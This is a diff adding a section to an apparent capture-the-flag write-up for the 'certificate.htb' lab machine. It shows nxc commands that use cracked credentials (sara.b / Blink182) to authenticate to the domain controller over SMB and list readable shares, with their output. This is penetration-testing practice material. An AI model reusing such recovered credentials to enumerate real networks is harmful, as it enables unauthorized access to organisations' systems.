@@ -310,6 +310,38 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
 
+### 🧠 Enumerating SMB with Valid Credentials
+
+<p class="indent-paragraph">
+With the administrator credentials retrieved from the web application's database, we transitioned to internal enumeration. Using the username <code>sara.b</code> and the recovered password <code>Blink182</code>, we performed SMB authentication against the domain controller. The credentials were successfully validated, confirming that the compromised user is part of the internal domain <code>certificate.htb</code><span class="codefix">.</span>
+</p>
+
+```
+~$ nxc smb dc.01certificate.htb -u sara.b -p 'Blink182'                                                 
+SMB         <IP>     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certificate.htb) (signing:True) (SMBv1:False)
+SMB         <IP>     445    DC01             [+] certificate.htb\sara.b:Blink182 
+```
+
+<p class="indent-paragraph">
+With valid domain credentials for <code>sara.b</code>, we proceeded to enumerate available SMB shares on the <code>DC01</code> host using <code>nxc</code><span class="codefix">.</span> The account successfully authenticated and revealed accessible shares such as <code>NETLOGON</code>, <code>SYSVOL</code>, and <code>IPC$</code>, all with read permissions. Although no writeable shares were identified at this stage, this level of access is often sufficient to proceed with further enumeration or identify exploitable misconfigurations in Active Directory environments.
+</p>
+
+```
+~$ nxc smb dc01.certificate.htb -u sara.b -p 'Blink182' --shares
+SMB         <IP>     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certificate.htb) (signing:True) (SMBv1:False) 
+SMB         <IP>     445    DC01             [+] certificate.htb\sara.b:Blink182 
+SMB         <IP>     445    DC01             [*] Enumerated shares
+SMB         <IP>     445    DC01             Share           Permissions     Remark
+SMB         <IP>     445    DC01             -----           -----------     ------
+SMB         <IP>     445    DC01             ADMIN$                          Remote Admin
+SMB         <IP>     445    DC01             C$                              Default share
+SMB         <IP>     445    DC01             IPC$            READ            Remote IPC
+SMB         <IP>     445    DC01             NETLOGON        READ            Logon server share 
+SMB         <IP>     445    DC01             SYSVOL          READ            Logon server share
+```
+
+
+
 
 ---
 <p class="indent-paragraph">
